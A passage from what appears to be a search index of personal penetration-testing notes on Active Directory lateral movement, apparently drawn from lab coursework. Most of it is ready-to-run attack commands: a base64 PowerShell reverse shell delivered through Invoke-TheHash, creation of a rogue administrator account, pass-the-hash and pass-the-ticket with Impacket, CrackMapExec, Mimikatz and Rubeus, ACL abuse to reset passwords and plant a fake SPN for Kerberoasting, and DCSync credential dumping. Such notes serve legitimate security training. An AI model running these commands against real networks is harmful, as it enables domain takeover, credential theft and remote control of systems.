-Domain inlanefreight.htb -Username david -Hash c39f2beb3d2ec06a62cb887fb391dee0 -Command \"net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add\" -Verbose\n</code></pre> <p>To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address 172.16.1.5. We will use port 8001 to wait for the connection.</p> <p>Netcat Listener - <code>.\\nc.exe -lvnp 8001</code></p> <p>To create a simple reverse shell using PowerShell, we can visit https://www.revshells.com/, set our IP 172.16.1.5 and port 8080, and select the option PowerShell #3 (Base64), as shown in the following image.</p> <p>Now we can execute Invoke-TheHash to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is 172.16.1.10, we will use the machine name DC01 (either would work).</p> <pre><code>Import-Module .\\Invoke-TheHash.psd1\nInvoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command \"powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADgAMAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=\"\n</code></pre> <p>The result is a reverse shell connection from the DC01 host (172.16.1.10).</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheHash/#pseudo-shell-file-write-and-read","title":"pseudo-shell (file write and read)","text":""},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheHash/#impacket-toolkit","title":"Impacket Toolkit","text":"<pre><code>$ atexec.py -hashes \":&lt;hash&gt;\" &lt;user&gt;@&lt;ip&gt;\" command\"\n$ smbexec.py -hashes \":&lt;hash&gt;\"&lt;user&gt;@&lt;ip&gt; \n$ wmiexec.py -hashes\":&lt;hash&gt;\" &lt;user&gt;@&lt;ip&gt; \n$ dcomexec.py -hashes \":&lt;hash&gt;\"&lt;user&gt;@&lt;ip&gt; \n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheHash/#crackmapexec","title":"CrackMapExec","text":"<p>CrackMapExec is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. We can use CrackMapExec to try to authenticate to some or all hosts in a network looking for one host where we can authenticate successfully as a local admin. This method is also called \"Password Spraying\" and is covered in-depth in the Active Directory Enumeration &amp; Attacks module. Note that this method can lock out domain accounts, so keep the target domain's account lockout policy in mind and make sure to use the local account method, which will try just one login attempt on a host in a given range using the credentials provided if that is your intent.</p> <pre><code># No sure about :\n$ crackmapexec smb &lt;ip_range&gt; -u &lt;user&gt; -d &lt;domain&gt; -H ':&lt;hash&gt;' \n$ crackmapexec smb &lt;ip_range&gt; -u &lt;user&gt; -H ':&lt;hash&gt;' --local-auth\n</code></pre> <p>If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add --local-auth to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see Pwn3d!, it means that the user is a local administrator on the target computer. We can use the option -x to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration. If we run into this issue on a real-world engagement, a great recommendation for the customer is to implement the Local Administrator Password Solution (LAPS), which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.</p> <p>CrackMapExec - Command Execution**</p> <pre><code>$ crackmapexec smb &lt;ip_range&gt; -u &lt;user&gt; -H ':&lt;hash&gt;' --local-auth -x whoami\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheHash/#evil-winrm","title":"Evil-winrm","text":"<pre><code>$ evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -H &lt;hash&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheHash/#rdp","title":"RDP","text":"<p>We can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp.</p> <p>There are a few caveats to this attack:</p> <pre><code>Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:\n</code></pre> <p>This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa with the value of 0. It can be done using the following command:</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheHash/#enable-restricted-admin-mode-to-allow-pth","title":"Enable Restricted Admin Mode to Allow PtH","text":"<pre><code>&gt; reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n</code></pre> <p>Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheHash/#pass-the-hash-using-rdp","title":"Pass the Hash Using RDP","text":"<pre><code>$ xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;hash&gt; /v:&lt;ip&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheHash/#smb","title":"SMB","text":"<pre><code>$ smbclient.py -hashes\":&lt;hash&gt;\" &lt;user&gt;@&lt;ip&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheHash/#mssql","title":"MSSQL","text":"<pre><code>$ crackmapexec mssql &lt;ip_range&gt; -H':&lt;hash&gt;'\n$ mssqlclient.py -windows-auth -hashes\":&lt;hash&gt;\"&lt;domain&gt;/&lt;user&gt;@&lt;ip&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheHash/#uac-limits-pass-the-hash-for-local-accounts","title":"UAC Limits Pass the Hash for Local Accounts","text":"<p>UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy is set to 0, it means that the built-in local admin account (RID-500, \"Administrator\") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.</p> <p>Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.</p> <p>These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder's blog post Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy.</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheKeyorOverPassTheHash/","title":"Pass the Key or OverPass the Hash","text":"<ul> <li>https://lisandre.com/archives/14788</li> <li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key</li> <li>https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/</li> <li>https://www.thehacker.recipes/ad/movement/kerberos/ptk</li> </ul> <p>The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT). This technique was developed by Benjamin Delpy and Skip Duckwall in their presentation Abusing Microsoft Kerberos - Sorry you guys don't get it. Also Will Schroeder adapted their project to create the Rubeus tool.</p> <p>To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys. This module will enumerate all key types present for the Kerberos package.</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheKeyorOverPassTheHash/#mimikatz-extract-kerberos-keys","title":"Mimikatz - Extract Kerberos Keys","text":"<pre><code>&gt; mimikatz.exe\n&gt; privilege::debug\n&gt; sekurlsa::ekeys\n</code></pre> <p>Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheKeyorOverPassTheHash/#mimikatz-pass-the-key-or-overpass-the-hash","title":"Mimikatz - Pass the Key or OverPass the Hash","text":"<pre><code>&gt; mimikatz.exe\n&gt; privilege::debug\n&gt; sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f\n</code></pre> <p>This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.</p> <p>To forge a ticket using Rubeus, we can use the module asktgt with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des. In the following example, we use the aes256 hash from the information we collect using Mimikatz sekurlsa::ekeys.</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheKeyorOverPassTheHash/#rubeus-pass-the-key-or-overpass-the-hash","title":"Rubeus - Pass the Key or OverPass the Hash","text":"<pre><code>&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /nowrap\n</code></pre> <p><code>Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.</code></p> <p><code>Note: Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an \"encryption downgrade.\"</code></p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheKeyorOverPassTheHash/#remotely","title":"Remotely","text":"<p>I wish to execute this attack remotely then use impacket python script gettgt.py which will use a password, hash or aesKey, it will request a TGT and save it as ccache.</p> <pre><code># with an NT hash (overpass-the-hash)\n$ getTGT.py -dc-ip &lt;IP&gt; -hashes :&lt;NTLM hash&gt; &lt;DOMAIN&gt;/&lt;USER&gt;\n\n# with an AES (128 or 256 bits) key (pass-the-key)\n$ getTGT.py -dc-ip &lt;IP&gt; -aesKey'&lt;aes Key&gt;' &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;IP&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheTicket/","title":"Pass the Ticket (PtT)","text":"<ul> <li>https://lisandre.com/archives/14885</li> <li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-ticket Another method for moving laterally in an Active Directory environment is called a Pass the Ticket (PtT) attack. In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash. We'll cover several ways to perform a PtT attack from Windows</li> </ul> <p>Now that we have some Kerberos tickets, we can use them to move laterally within an environment.</p> <p>With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheTicket/#rubeus-pass-the-ticket","title":"Rubeus Pass the Ticket","text":"<pre><code>&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /rc4:c4b0e1b10c7ce2c4723b4e2407ef81a2 /ptt\n</code></pre> <p>Note that now it displays Ticket successfully imported!.</p> <p>Another way is to import the ticket into the current session using the .kirbi file from the disk.</p> <p>Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheTicket/#rubeus-pass-the-ticket-using-kirbi","title":"Rubeus - Pass the Ticket using kirbi","text":"<pre><code>&gt; Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi`\n</code></pre> <p>We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheTicket/#convert-kirbi-to-base64-format","title":"Convert .kirbi to Base64 Format","text":"<pre><code>PS &gt; [Convert]::ToBase64String([IO.File]::ReadAllBytes(\"[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi\"))`\n</code></pre> <p>Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheTicket/#pass-the-ticket-base64-format","title":"Pass the Ticket - Base64 Format","text":"<pre><code>&gt; Rubeus.exe ptt /ticket: &lt;Ticket&gt;\n</code></pre> <p>Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheTicket/#mimikatz-pass-the-ticket-using-kirbi","title":"Mimikatz - Pass the Ticket using kirbi","text":"<pre><code>&gt; mimikatz.exe \n&gt; privilege::debug\n&gt; kerberos::ptt \"C:\\Users\\plaintext\\Desktop\\Mimikatz\\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi\"\n&gt; exit\n</code></pre> <p><code>Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.</code></p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheTicket/#pass-the-ticket-with-powershell-remoting","title":"Pass The Ticket with PowerShell Remoting","text":"<p>To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheTicket/#mimikatz-powershell-remoting-with-pass-the-ticket","title":"Mimikatz - PowerShell Remoting with Pass the Ticket","text":"<pre><code>&gt; mimikatz.exe\n&gt; privilege::debug\n&gt; kerberos::ptt \"C:\\Users\\Administrator.WIN01\\Desktop\\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi\"\n&gt; exit\n&gt; powershell\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheTicket/#rubeus-powershell-remoting-with-pass-the-ticket","title":"Rubeus - PowerShell Remoting with Pass the Ticket","text":""},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheTicket/#create-a-sacrificial-process-with-rubeus","title":"Create a Sacrificial Process with Rubeus","text":"<pre><code>&gt; Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show\n</code></pre> <p>The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheTicket/#rubeus-pass-the-ticket-for-lateral-movement","title":"Rubeus - Pass the Ticket for Lateral Movement","text":"<pre><code>&gt; Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt\n&gt; powershell\n&gt; Enter-PSSession -ComputerName DC01\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheTicket/#getting-a-system-shell-using-impacket","title":"Getting a SYSTEM shell using Impacket","text":"<p>With ccache file obtained Passing the Key or Overpassing the Hash, to execute impacket tools, the ccache file needs to be exported to  environment variable.</p> <pre><code>$ ticketConverter.py &lt;kirbi||ccache&gt; &lt;kirbi||ccache&gt;\n$ export KRB5CCNAME=&lt;path_to_ticket&gt;.ccache\n$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5\n\n\n# Same as PassTheHash but use -k and -no-pass \n$ psexec.py -dc-ip IP -target-ip $IP -no-pass -k &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;target machine name&gt;.&lt;DOMAIN&gt; -&gt; goat\n$ psexec.py -dc-ip &lt;IP&gt; -no-pass -k &lt;domain&gt;/&lt;user&gt;:@&lt;ip&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/07-PermissionsMove/AbsuingACL/","title":"ACL Enumeration","text":"<p>Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the \"low hanging fruit\" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:</p> <p></p> <p>ForceChangePassword abused with Set-DomainUserPassword Add Members abused with Add-DomainGroupMember GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember GenericWrite abused with Set-DomainObject WriteOwner abused with Set-DomainObjectOwner WriteDACL abused with Add-DomainObjectACL AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember Addself abused with Add-DomainGroupMember</p>"},{"location":"zNew/ActiveDirectory/07-PermissionsMove/AbsuingACL/#enumerating-acls-with-powerview","title":"Enumerating ACLs with PowerView","text":"<p>Using Find-InterestingDomainAcl</p> <pre><code>PS &gt; Find-InterestingDomainAcl\n</code></pre> <p>We can then use the Get-DomainObjectACL function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the $sid variable to the SecurityIdentifier property which is what tells us who has the given right over an object. One important thing to note is that if we search without the flag ResolveGUIDs, we will see results like the below, where the right ExtendedRight does not give us a clear picture of what ACE entry the user wley has over damundsen. This is because the ObjectAceType property is returning a GUID value that is not human readable.</p> <p>Note that this command will take a while to run, especially in a large environment. It may take 1-2 minutes to get a result in our lab.</p> <p>Using Get-DomainObjectACL</p> <pre><code>PS &gt; Import-Module .\\PowerView.ps1\nPS &gt; $sid = Convert-NameToSid &lt;USERNAME&gt;\nPS &gt; Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}\n</code></pre> <p>Performing a Reverse Search &amp; Mapping to a GUID Value</p> <pre><code>PS &gt; $guid= \"&lt;ObjectAceType&gt;\"\nPS &gt; Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl\n</code></pre> <p>Using the -ResolveGUIDs Flag</p> <pre><code>PS &gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} \n</code></pre> <p>Creating a List of Domain Users</p> <pre><code>PS &gt; Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt\n</code></pre> <p>A Useful foreach Loop</p> <pre><code>PS &gt; foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\htb-student\\Desktop\\ad_users.txt\")) {get-acl  \"AD:\\$(Get-ADUser $line)\" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'}}\n</code></pre> <p>Further Enumeration of Rights Using damundsen</p> <pre><code>PS &gt; $sid2 = Convert-NameToSid damundsen\nPS &gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose\n</code></pre> <p>Investigating the Help Desk Level 1 Group with Get-DomainGroup</p> <pre><code>PS &gt; Get-DomainGroup -Identity \"Help Desk Level 1\" | select memberof\n</code></pre> <p>Investigating the Information Technology Group</p> <pre><code>PS &gt; $itgroupsid = Convert-NameToSid \"Information Technology\"\nPS &gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose\n</code></pre> <p>Looking for Interesting Access</p> <pre><code>PS &gt; $adunnsid = Convert-NameToSid adunn \nPS &gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose\n</code></pre>"},{"location":"zNew/ActiveDirectory/07-PermissionsMove/AbsuingACL/#enumerating-acls-with-bloodhound","title":"Enumerating ACLs with BloodHound","text":"<p>Next, we can set the  user as our starting node, select the Node Info tab and scroll down to Outbound Control Rights"},{"location":"zNew/ActiveDirectory/07-PermissionsMove/AbsuingACL/#acl-abuse-tactics","title":"ACL Abuse Tactics","text":""},{"location":"zNew/ActiveDirectory/07-PermissionsMove/AbsuingACL/#abusing-acls","title":"Abusing ACLs","text":""},{"location":"zNew/ActiveDirectory/07-PermissionsMove/AbsuingACL/#forcechangepassword","title":"ForceChangePassword","text":"<p>So, first, we must authenticate as wley and force change the password of the user damundsen. We can start by opening a PowerShell console and authenticating as the wley user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a PSCredential object.</p> <p>Creating a PSCredential Object</p> <pre><code>PS &gt; $SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force\nPS &gt; $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword) \n</code></pre> <p>Creating a SecureString Object</p> <pre><code>PS &gt; $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\n</code></pre> <p>Changing the User's Password</p> <pre><code>PS &gt; Import-Module .\\PowerView.ps1\nPS &gt; Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose\n</code></pre> <p>We can see that the command completed successfully, changing the password for the target user while using the credentials we specified for the wley user that we control. Next, we need to perform a similar process to authenticate as the damundsen user and add ourselves to the Help Desk Level 1 group.</p>"},{"location":"zNew/ActiveDirectory/07-PermissionsMove/AbsuingACL/#add-domaingroupmember","title":"Add-DomainGroupMember","text":"<p>Creating a SecureString Object using damundsen</p> <pre><code>PS &gt; $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\nPS &gt; $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\damundsen', $SecPassword) \n</code></pre> <p>Next, we can use the Add-DomainGroupMember function to add ourselves to the target group</p> <p>Adding damundsen to the Help Desk Level 1 Group</p> <pre><code>PS &gt; Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose\n\nPS &gt; Get-ADGroup -Identity \"Help Desk Level 1\" -Properties * | Select -ExpandProperty Members\n</code></pre> <p>Confirming damundsen was Added to the Group</p> <pre><code>PS &gt; Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName\n</code></pre> <p>At this point, we should be able to leverage our new group membership to take control over the adunn user. Now, let's say that our client permitted us to change the password of the damundsen user, but the adunn user is an admin account that cannot be interrupted. Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.</p> <p>We must be authenticated as a member of the Information Technology group for this to be successful. Since we added damundsen to the Help Desk Level 1 group, we inherited rights via nested group membership. We can now use Set-DomainObject to create the fake SPN. We could use the tool targetedKerberoast [https://github.com/ShutdownRepo/targetedKerberoast] to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.</p>"},{"location":"zNew/ActiveDirectory/07-PermissionsMove/AbsuingACL/#creating-a-fake-spn","title":"Creating a Fake SPN","text":"<pre><code>PS &gt; Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose\n</code></pre> <pre><code>$ targetedKerberoast.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt;\n</code></pre> <p>Kerberoasting with Rubeus</p> <pre><code>PS &gt; .\\Rubeus.exe kerberoast /user:adunn /nowrap\n</code></pre>"},{"location":"zNew/ActiveDirectory/07-PermissionsMove/AbsuingACL/#cleanup","title":"Cleanup","text":"<p>Removing the Fake SPN from adunn's Account</p> <pre><code>PS &gt; Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose\n</code></pre> <p>Removing damundsen from the Help Desk Level 1 Group</p> <pre><code>PS &gt; Remove-DomainGroupMember -Identity \"Help Desk Level 1\" -Members 'damundsen' -Credential $Cred2 -Verbose\n</code></pre> <p>Confirming damundsen was Removed from the Group</p> <pre><code>PS &gt; Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose\n</code></pre>"},{"location":"zNew/ActiveDirectory/07-PermissionsMove/DCSync/","title":"DCSync","text":"<p>DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.</p> <p>The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.</p> <p>To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.</p>"},{"location":"zNew/ActiveDirectory/07-PermissionsMove/DCSync/#using-get-domainuser-to-view-adunns-group-membership","title":"Using Get-DomainUser to View adunn's Group Membership","text":"<pre><code>PS &gt; Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl\n</code></pre>"},{"location":"zNew/ActiveDirectory/07-PermissionsMove/DCSync/#using-get-objectacl-to-check-adunns-replication-rights","title":"Using Get-ObjectAcl to Check adunn's Replication Rights","text":"<pre><code>PS &gt; $sid= \"S-1-5-21-3842939050-3880317879-2865463114-1164\"\nPS &gt; Get-ObjectAcl \"DC=inlanefreight,DC=local\" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl\n</code></pre>"},{"location":"zNew/ActiveDirectory/07-PermissionsMove/DCSync/#extracting-ntlm-hashes-and-kerberos-keys-using-secretsdumppy","title":"Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py","text":"<pre><code>$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 \n$ secretsdump.py -outputfile inlanefreight_hashes &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;DC_IP&gt; \n</code></pre> <p>We can use the -just-dc-ntlm flag if we only want NTLM hashes or specify -just-dc-user  to only extract data for a specific user. Other useful options include -pwd-last-set to see when each account's password was last changed and -history if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The -user-status is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as: <p>If we check the files created using the -just-dc flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with reversible encryption enabled.</p>"},{"location":"zNew/ActiveDirectory/07-PermissionsMove/DCSync/#using-runasexe","title":"Using runas.exe","text":"<pre><code>&gt; runas /netonly /user:INLANEFREIGHT\\adunn powershell\n</code></pre>"},{"location":"zNew/ActiveDirectory/07-PermissionsMove/DCSync/#performing-the-attack-with-mimikatz","title":"Performing the Attack with Mimikatz","text":"<pre><code>PS &gt; .\\mimikatz.exe\nmimikatz # privilege::debug\nmimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/AttackingDomainTrustsChildTrusts/","title":"Attacking Domain Trusts - Child -&gt; Parent 